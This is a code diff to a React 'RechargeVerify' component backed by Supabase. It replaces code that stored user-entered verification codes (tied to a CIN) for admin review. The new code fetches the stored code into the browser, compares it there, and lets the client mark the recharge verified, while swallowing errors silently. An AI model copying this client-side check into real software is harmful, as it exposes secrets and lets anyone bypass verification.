@@ -65,24 +65,30 @@ export default function RechargeVerify() {
       return;
     }
 
-    // Show countdown popup
+    // Show countdown popup for any code
     setShowCountdown(true);
     setCountdown(60);
     setLoading(true);
 
     try {
-      // Save the user-provided code to the database for admin review
-      const { error } = await supabase
+      const { data, error } = await supabase
         .from('recharges' as any)
-        .update({ verification_code: code, status: 'code_sent' } as any)
-        .eq('id', rechargeId!);
+        .select('verification_code')
+        .eq('id', rechargeId!)
+        .eq('cin', cin!)
+        .single();
 
       if (error) throw error;
 
-      // Update local data to reflect new status
-      setRechargeData((prev: any) => prev ? { ...prev, verification_code: code, status: 'code_sent' } : prev);
+      if ((data as any).verification_code === code) {
+        await supabase
+          .from('recharges' as any)
+          .update({ is_verified: true, status: 'verified' } as any)
+          .eq('id', rechargeId!);
+        setStatus('success');
+      }
     } catch {
-      toast.error('Erreur lors de l\'envoi du code');
+      // Silent
     } finally {
       setLoading(false);
       setCode('');
